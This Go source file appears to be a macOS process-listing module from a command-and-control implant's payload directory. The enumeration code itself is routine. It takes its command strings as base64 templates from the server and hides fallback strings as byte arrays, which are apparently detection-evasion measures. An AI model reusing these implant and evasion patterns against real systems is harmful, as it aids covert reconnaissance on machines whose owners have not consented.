// server/docker/payloads/Darwin/action_ps.go

//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"sort"
	"strings"
	"time"

	"github.com/shirou/gopsutil/v3/process"
)

// PsTemplate matches the server's CommandTemplate structure
type PsTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Template indices - must match server's common.go
const (
	idxPsProcCmdline  = 160
	idxPsProcExe      = 161
	idxPsProcStat     = 162
	idxPsProcStatus   = 163
	idxPsProcDir      = 164
	idxPsOsLinux      = 165
	idxPsOsWindows    = 166
	idxPsOsDarwin     = 167
	idxPsFlagVerbose  = 168
	idxPsFlagExtended = 169
	idxPsFlagJson     = 170
	idxPsFlagNoTrunc  = 171
	idxPsFlagFilter   = 172
	idxPsFlagUser     = 173
	idxPsFlagSort     = 174
	idxPsSortCpu      = 175
	idxPsSortMem      = 176
	idxPsSortMemory   = 177
	idxPsSortName     = 178
	idxPsSortUser     = 179
	idxPsSortPid      = 180
)

// Minimal fallback strings as byte arrays
var (
	fallbackLinux   = string([]byte{0x6c, 0x69, 0x6e, 0x75, 0x78})             // linux
	fallbackWindows = string([]byte{0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73}) // windows
)

// ProcessInfo represents information about a process
type ProcessInfo struct {
	PID         int32   `json:"pid"`
	PPID        int32   `json:"ppid"`
	Name        string  `json:"name"`
	Username    string  `json:"username,omitempty"`
	CommandLine string  `json:"cmdline,omitempty"`
	Executable  string  `json:"exe,omitempty"`
	CPU         float64 `json:"cpu_percent,omitempty"`
	Memory      float32 `json:"memory_percent,omitempty"`
	MemoryMB    float64 `json:"memory_mb,omitempty"`
	CreateTime  string  `json:"create_time,omitempty"`
	Status      string  `json:"status,omitempty"`
	NumThreads  int32   `json:"num_threads,omitempty"`
	NumFDs      int32   `json:"num_fds,omitempty"`
	Nice        int32   `json:"nice,omitempty"`
}

// PSFlags represents the flags for the ps command
type PSFlags struct {
	Verbose    bool
	Extended   bool
	Json       bool
	NoTruncate bool
	Filter     string
	User       string
	Sort       string
}

// PSCommand implements the command interface for process listing
type PSCommand struct {
	tpl *PsTemplate
}

// getTpl safely retrieves a template string by index
func (c *PSCommand) getTpl(idx int) string {
	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
		return c.tpl.Templates[idx]
	}
	return ""
}

// getFullCommandLine attempts to get the full command line without truncation
func (c *PSCommand) getFullCommandLine(pid int32) string {
	osLinux := c.getTpl(idxPsOsLinux)
	if osLinux == "" {
		osLinux = fallbackLinux
	}

	if runtime.GOOS == osLinux {
		cmdlineFmt := c.getTpl(idxPsProcCmdline)
		if cmdlineFmt == "" {
			cmdlineFmt = "/proc/%d/cmdline"
		}
		cmdlineFile := fmt.Sprintf(cmdlineFmt, pid)
		data, err := os.ReadFile(cmdlineFile)
		if err == nil && len(data) > 0 {
			cmdline := string(bytes.ReplaceAll(data, []byte{0}, []byte{' '}))
			cmdline = strings.TrimSpace(cmdline)
			return cmdline
		}
	}
	return ""
}

// getFullExecutablePath attempts to get the full executable path without truncation
func (c *PSCommand) getFullExecutablePath(pid int32) string {
	osLinux := c.getTpl(idxPsOsLinux)
	if osLinux == "" {
		osLinux = fallbackLinux
	}

	if runtime.GOOS == osLinux {
		exeFmt := c.getTpl(idxPsProcExe)
		if exeFmt == "" {
			exeFmt = "/proc/%d/exe"
		}
		exeLink := fmt.Sprintf(exeFmt, pid)
		if path, err := os.Readlink(exeLink); err == nil {
			return path
		}
	}
	return ""
}

// Execute runs the ps command with the given arguments
func (c *PSCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from Command.Data - required for operation
	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
		return CommandResult{
			Output:   Err(E18),
			ExitCode: 1,
		}
	}

	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
	if err != nil {
		return CommandResult{
			Output:   Err(E18),
			ExitCode: 1,
		}
	}

	c.tpl = &PsTemplate{}
	if err := json.Unmarshal(decoded, c.tpl); err != nil {
		return CommandResult{
			Output:   Err(E18),
			ExitCode: 1,
		}
	}

	flags := c.parsePSFlags(args)

	var output strings.Builder

	// Get all processes
	procs, err := process.Processes()
	if err != nil {
		return CommandResult{
			Output:   Err(E19),
			ExitCode: 1,
		}
	}

	// Convert to our ProcessInfo format
	processes := make([]ProcessInfo, 0, len(procs))

	osLinux := c.getTpl(idxPsOsLinux)
	if osLinux == "" {
		osLinux = fallbackLinux
	}
	osWindows := c.getTpl(idxPsOsWindows)
	if osWindows == "" {
		osWindows = fallbackWindows
	}

	for _, p := range procs {
		procInfo := ProcessInfo{
			PID: p.Pid,
		}

		// Always get basic info
		if name, err := p.Name(); err == nil {
			procInfo.Name = name
		}

		if ppid, err := p.Ppid(); err == nil {
			procInfo.PPID = ppid
		}

		// Get verbose info if requested
		if flags.Verbose || flags.NoTruncate {
			if runtime.GOOS == osLinux {
				if fullCmd := c.getFullCommandLine(p.Pid); fullCmd != "" {
					procInfo.CommandLine = fullCmd
				} else if cmdline, err := p.Cmdline(); err == nil && cmdline != "" {
					procInfo.CommandLine = cmdline
				}

				if fullExe := c.getFullExecutablePath(p.Pid); fullExe != "" {
					procInfo.Executable = fullExe
				} else if exe, err := p.Exe(); err == nil {
					procInfo.Executable = exe
				}
			} else {
				if cmdSlice, err := p.CmdlineSlice(); err == nil && len(cmdSlice) > 0 {
					procInfo.CommandLine = strings.Join(cmdSlice, " ")
				} else if cmdline, err := p.Cmdline(); err == nil && cmdline != "" {
					procInfo.CommandLine = cmdline
				}

				if exe, err := p.Exe(); err == nil {
					procInfo.Executable = exe
				}
			}
		}

		// Get extended info if requested
		if flags.Extended {
			if username, err := p.Username(); err == nil {
				procInfo.Username = username
			}

			if cpu, err := p.CPUPercent(); err == nil {
				procInfo.CPU = cpu
			}

			if memInfo, err := p.MemoryInfo(); err == nil {
				procInfo.MemoryMB = float64(memInfo.RSS) / 1024 / 1024
			}

			if memPercent, err := p.MemoryPercent(); err == nil {
				procInfo.Memory = memPercent
			}

			if createTime, err := p.CreateTime(); err == nil {
				procInfo.CreateTime = time.Unix(createTime/1000, 0).Format("15:04:05")
			}

			if status, err := p.Status(); err == nil {
				procInfo.Status = parseStatus(status)
			}

			if numThreads, err := p.NumThreads(); err == nil {
				procInfo.NumThreads = numThreads
			}

			if runtime.GOOS != osWindows {
				if numFDs, err := p.NumFDs(); err == nil {
					procInfo.NumFDs = numFDs
				}
			}

			if nice, err := p.Nice(); err == nil {
				procInfo.Nice = nice
			}
		}

		// Apply user filter if specified
		if flags.User != "" && flags.Extended {
			if procInfo.Username != flags.User {
				continue
			}
		}

		// Apply name filter if specified
		if flags.Filter != "" {
			filter := strings.ToLower(flags.Filter)
			if !strings.Contains(strings.ToLower(procInfo.Name), filter) &&
				!strings.Contains(strings.ToLower(procInfo.CommandLine), filter) {
				continue
			}
		}

		processes = append(processes, procInfo)
	}

	// Sort processes
	c.sortProcesses(processes, flags.Sort)

	// Format output
	if flags.Json {
		jsonData, err := json.MarshalIndent(processes, "", "  ")
		if err != nil {
			return CommandResult{
				Output:   Err(E18),
				ExitCode: 1,
			}
		}
		output.Write(jsonData)
	} else {
		c.formatProcessTable(&output, processes, flags)
	}

	return CommandResult{
		Output:   output.String(),
		ExitCode: 0,
	}
}

// parsePSFlags parses command line flags
func (c *PSCommand) parsePSFlags(args []string) PSFlags {
	flags := PSFlags{}

	// Get flag strings from template
	flagV := c.getTpl(idxPsFlagVerbose)
	if flagV == "" {
		flagV = "-v"
	}
	flagX := c.getTpl(idxPsFlagExtended)
	if flagX == "" {
		flagX = "-x"
	}
	flagJ := c.getTpl(idxPsFlagJson)
	if flagJ == "" {
		flagJ = "-j"
	}
	flagN := c.getTpl(idxPsFlagNoTrunc)
	if flagN == "" {
		flagN = "-n"
	}
	flagF := c.getTpl(idxPsFlagFilter)
	if flagF == "" {
		flagF = "-f"
	}
	flagU := c.getTpl(idxPsFlagUser)
	if flagU == "" {
		flagU = "-u"
	}
	flagS := c.getTpl(idxPsFlagSort)
	if flagS == "" {
		flagS = "-s"
	}

	for i := 0; i < len(args); i++ {
		arg := args[i]
		switch arg {
		case flagV:
			flags.Verbose = true
		case flagX:
			flags.Extended = true
		case flagJ:
			flags.Json = true
		case flagN:
			flags.NoTruncate = true
		case flagF:
			if i+1 < len(args) {
				flags.Filter = args[i+1]
				i++
			}
		case flagU:
			if i+1 < len(args) {
				flags.User = args[i+1]
				i++
			}
		case flagS:
			if i+1 < len(args) {
				flags.Sort = args[i+1]
				i++
			}
		}
	}

	return flags
}

// parseStatus converts status codes to short markers
func parseStatus(status []string) string {
	if len(status) == 0 {
		return "?"
	}

	statusMap := map[string]string{
		"R": VRunning,
		"S": VSleeping,
		"D": VDiskSleep,
		"T": VStopped,
		"Z": VZombie,
		"I": VIdle,
		"W": VPaging,
		"X": VDead,
	}

	if mapped, ok := statusMap[status[0]]; ok {
		return mapped
	}

	return status[0]
}

// sortProcesses sorts the process list based on the sort field
func (c *PSCommand) sortProcesses(processes []ProcessInfo, sortField string) {
	sortCpu := c.getTpl(idxPsSortCpu)
	if sortCpu == "" {
		sortCpu = "cpu"
	}
	sortMem := c.getTpl(idxPsSortMem)
	if sortMem == "" {
		sortMem = "mem"
	}
	sortMemory := c.getTpl(idxPsSortMemory)
	if sortMemory == "" {
		sortMemory = "memory"
	}
	sortName := c.getTpl(idxPsSortName)
	if sortName == "" {
		sortName = "name"
	}
	sortUser := c.getTpl(idxPsSortUser)
	if sortUser == "" {
		sortUser = "user"
	}

	switch strings.ToLower(sortField) {
	case sortCpu:
		sort.Slice(processes, func(i, j int) bool {
			return processes[i].CPU > processes[j].CPU
		})
	case sortMem, sortMemory:
		sort.Slice(processes, func(i, j int) bool {
			return processes[i].Memory > processes[j].Memory
		})
	case sortName:
		sort.Slice(processes, func(i, j int) bool {
			return strings.ToLower(processes[i].Name) < strings.ToLower(processes[j].Name)
		})
	case sortUser:
		sort.Slice(processes, func(i, j int) bool {
			return strings.ToLower(processes[i].Username) < strings.ToLower(processes[j].Username)
		})
	default: // Default to PID
		sort.Slice(processes, func(i, j int) bool {
			return processes[i].PID < processes[j].PID
		})
	}
}

// formatProcessTable formats the process list as a table
func (c *PSCommand) formatProcessTable(output *strings.Builder, processes []ProcessInfo, flags PSFlags) {
	// Calculate column widths based on data
	widths := struct {
		pid, ppid, name, user, cpu, mem, memMB, status, cmd int
	}{
		pid: 3, ppid: 4, name: 4, user: 4, cpu: 4, mem: 4, memMB: 7, status: 6, cmd: 7,
	}

	// First pass: calculate max widths
	for _, p := range processes {
		if w := len(fmt.Sprintf("%d", p.PID)); w > widths.pid {
			widths.pid = w
		}
		if w := len(fmt.Sprintf("%d", p.PPID)); w > widths.ppid {
			widths.ppid = w
		}
		name := truncatePS(p.Name, 30, flags.NoTruncate)
		if w := len(name); w > widths.name {
			widths.name = w
		}

		if flags.Extended {
			user := truncatePS(p.Username, 20, flags.NoTruncate)
			if user == "" {
				user = "?"
			}
			if w := len(user); w > widths.user {
				widths.user = w
			}
			if w := len(fmt.Sprintf("%.1f", p.CPU)); w > widths.cpu {
				widths.cpu = w
			}
			if w := len(fmt.Sprintf("%.1f", p.Memory)); w > widths.mem {
				widths.mem = w
			}
			if w := len(fmt.Sprintf("%.1f", p.MemoryMB)); w > widths.memMB {
				widths.memMB = w
			}
			status := truncatePS(p.Status, 12, flags.NoTruncate)
			if w := len(status); w > widths.status {
				widths.status = w
			}
		}

		if flags.Verbose {
			cmd := p.CommandLine
			if cmd == "" {
				cmd = p.Executable
			}
			if cmd == "" {
				cmd = "?"
			}
			cmd = truncatePS(cmd, 100, flags.NoTruncate)
			if w := len(cmd); w > widths.cmd {
				widths.cmd = w
			}
		}
	}

	// Build format strings
	baseFormat := fmt.Sprintf("%%-%dd  %%-%dd  %%-%ds", widths.pid, widths.ppid, widths.name)

	extFormat := ""
	if flags.Extended {
		extFormat = fmt.Sprintf("  %%-%ds  %%%ds  %%%ds  %%%ds  %%-%ds",
			widths.user, widths.cpu, widths.mem, widths.memMB, widths.status)
	}

	verboseFormat := ""
	if flags.Verbose {
		verboseFormat = "  %s"
	}

	// Write table marker
	var tableType string
	if flags.Extended && flags.Verbose {
		tableType = TPSFull
	} else if flags.Extended {
		tableType = TPSExt
	} else if flags.Verbose {
		tableType = TPSVerb
	} else {
		tableType = TPS
	}
	output.WriteString(Table(tableType, len(processes)) + "\n")

	// Format each process
	for _, p := range processes {
		name := truncatePS(p.Name, 30, flags.NoTruncate)
		line := fmt.Sprintf(baseFormat, p.PID, p.PPID, name)

		if flags.Extended {
			user := truncatePS(p.Username, 20, flags.NoTruncate)
			if user == "" {
				user = "?"
			}
			status := truncatePS(p.Status, 12, flags.NoTruncate)
			line += fmt.Sprintf(extFormat,
				user,
				fmt.Sprintf("%.1f", p.CPU),
				fmt.Sprintf("%.1f", p.Memory),
				fmt.Sprintf("%.1f", p.MemoryMB),
				status)
		}

		if flags.Verbose {
			cmd := p.CommandLine
			if cmd == "" {
				cmd = p.Executable
			}
			if cmd == "" {
				cmd = "?"
			}
			line += fmt.Sprintf(verboseFormat, truncatePS(cmd, 100, flags.NoTruncate))
		}

		output.WriteString(line + "\n")
	}
}

// truncatePS truncates a string to maxLen unless noTruncate is true
func truncatePS(s string, maxLen int, noTruncate bool) string {
	if noTruncate || len(s) <= maxLen {
		return s
	}
	if maxLen <= 3 {
		return s[:maxLen]
	}
	return s[:maxLen-3] + "..."
}
